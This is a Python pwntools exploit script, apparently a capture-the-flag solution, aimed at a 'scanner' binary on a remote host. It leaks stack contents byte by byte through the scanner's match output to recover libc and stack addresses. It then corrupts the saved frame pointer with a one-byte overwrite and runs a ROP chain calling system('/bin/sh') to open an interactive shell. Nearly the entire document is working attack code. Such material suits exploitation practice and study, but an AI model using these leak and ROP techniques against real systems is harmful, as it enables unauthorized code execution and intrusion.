#!/usr/bin/env python3

from pwn import *

exe = ELF("./scanner_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])

        if args.DDEBUG:
            gdb.attach(r, """
                            break *main+0xad
                          """)
    else:
        r = remote("83.136.254.223", 58698)

    return r


# NOTE: Adapt this function so it can take an arbitrary string for the scanner
def read_parameters(scanner_index: int, search_text: bytes):
    scanners = {0: "naive1", 1: "naive2", 2: "memmem"}

    r.sendlineafter(b"Enter parameters: ", f"{scanners[scanner_index]} {len(search_text)}".encode("ascii"))
    r.sendline(search_text)


def update_buffer(buffer: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Enter new buffer: ", buffer)


def run_performance_test(scanner_index: int, search_text: bytes, iterations: int) -> list[bytes]:
    r.sendlineafter(b"> ", b"2")
    read_parameters(scanner_index, search_text)
    r.sendlineafter(b"Enter number of iterations: ", str(iterations).encode("ascii"))

    return r.recvlines(2)


def run_scanner(scanner_index: int, search_text: bytes) -> bytes:
    r.sendlineafter(b"> ", b"3")
    read_parameters(scanner_index, search_text)

    return r.recvline()


def leak_stack(n_entries: int) -> list[bytes]:
    leak = []
    cnt = 2

    for _ in range(n_entries * 8):
        # This is because the stack entry after the heap address is the length if the search_text.
        # This means we have to always change the byte string in order to fit the value in the stack.
        if len(leak) >= 9:
            leak[8] = (2 + len(leak) + 1).to_bytes(1, "little")

            # This might not work always (and it's ugly af) but it's a good way to speed up the
            # scanning part and avoid rescanning the heap address (we assume it's contiguous) 
            if leak[8] == b"\x19" or leak[8] == b"\x29" or leak[8] == b"\x39":
                leak[0] = (int.from_bytes(leak[0], "little") + 0x10 * cnt).to_bytes(1, "little")
                cnt += 1

        for b in range(0x0, 0x100):
            output = run_scanner(0, b"B\x00" + b"".join(leak) + b.to_bytes(1, "little"))

            if b"Found at" in output:
                leak.append(b.to_bytes(1, "little"))
                break

        print(f"Number of bytes matched : {len(leak)}/{n_entries*8}", end = "\r")

    # Compact everything in qwords
    leak = [b"".join(leak[i : i+8]) for i in range(0, len(leak), 8)]
    return leak


def spawn_shell(controlled_rbp: int, start_buffer: int, dummy_addr: int):
    rop = ROP(libc)

    # $rbp-0x4 <= 2 (scanner_index, which will be overwritten, over ours injected, by read_parameters)
    # $rbp-0x10 != 0 (buf; which is always different from 0) and $rbp-0x20 != 0 (search_text)
    # $rbp-0x28 <= $rbp-0x18 (search_text_size and buf_size, the latter is always 0x1000)

    # With this we can successfully overwrite RBP without segfaulting
    payload  = b"A" * (controlled_rbp - start_buffer - 0x28)
    payload += p64(0) + p64(1) + p64(1) + p64(dummy_addr) + p64(1)

    update_buffer(payload)

    # This changes the least significant byte of RBP to 0x00
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"Enter parameters: ", b"memmem\x00AAAAAAAAA 48")   # 48 so we can reuse the same heap chunk
    r.sendline(b"A" * 48)

    log.warn( f"Offset from new start buffer : {((start_buffer - 0x8) - (controlled_rbp - 0x1010))}" )

    # This is just in case it segfaults (with offset > 40 it crashes)
    if ((start_buffer - 0x8) - (controlled_rbp - 0x1010)) > 40:
        libc.address = 0x0
        r.close()
        main()

    else:
        # `start_buffer - 0x8` is the return address of `fgets()` and `controlled_rbp - 0x1010`
        payload  = b"A" * ((start_buffer - 0x8) - (controlled_rbp - 0x1010))
        payload += p64(rop.find_gadget(["pop rdi", "ret"])[0])      # return address (gadgets)
        payload += p64(next(libc.search(b"/bin/sh\x00")))           # "/bin/sh" string in LIBC
        payload += p64(rop.find_gadget(["ret"])[0])                 # dummy return address for `system()`
        payload += p64(libc.symbols["system"])                      # le GOAT

        # After the update, the ROP chain will be triggered automatically by the `ret` in `fgets()`
        update_buffer(payload)
        r.interactive("$ ")


def main():
    r = conn()

    # It mallocs and frees the search_buffer, thanks to the tcachebin it reuses the same chunk (= same heap address).
    # The only thing is that once we move from a size to another (e.g: 0x20 -> 0x30) the address changes and so we have
    # to re-scan that address to make everything work again.
    update_buffer(b"A" * 4094 + b"B")

    leaks = leak_stack(6)

    heap_chunk = int.from_bytes(leaks[0], "little")
    libc.address = int.from_bytes(leaks[3], "little") - (libc.symbols["__libc_start_main"] + 243)
    new_rbp = int.from_bytes(b"\x00" + leaks[5][1:], "little") - 0x100
    start_buffer = int.from_bytes(leaks[5], "little") - 0x1110 + 0x8

    log.info(f"LIBC address @ {hex(libc.address)}")
    log.info(f"New RBP will be @ {hex(new_rbp)}")
    log.info(f"Buffer starts @ {hex(start_buffer)}")

    spawn_shell(new_rbp, start_buffer, heap_chunk)


if __name__ == "__main__":
    main()
